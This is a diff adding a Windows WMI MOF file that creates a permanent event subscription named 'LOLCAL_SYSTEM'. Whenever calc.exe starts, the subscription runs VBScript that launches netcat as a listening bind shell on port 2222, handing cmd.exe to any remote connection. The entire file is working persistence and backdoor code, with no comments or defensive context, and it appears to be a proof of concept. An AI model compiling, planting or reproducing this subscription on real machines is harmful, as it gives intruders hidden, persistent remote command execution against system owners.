@@ -1,0 +1,27 @@
+#pragma namespace ("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $FILTER
+{
+    Name = "LOLCAL_SYSTEM";
+    EventNamespace = "root\\cimv2";
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 "
+      "WHERE TargetInstance ISA \"Win32_Process\" "
+      "AND TargetInstance.Name = \"calc.exe\"";
+    QueryLanguage = "WQL";
+};
+
+instance of ActiveScriptEventConsumer as $CONSUMER
+{
+    Name = "LOLCAL_SYSTEM";
+    ScriptingEngine = "VBScript";
+    
+    ScriptText =
+      "Set objShell = CreateObject(\"WScript.Shell\")\n"
+      "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C start C:\\outils\\nc111nt\\nc.exe -L -p 2222 -d -e cmd.exe\"\n";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer = $CONSUMER ;
+    Filter = $FILTER ;
+};
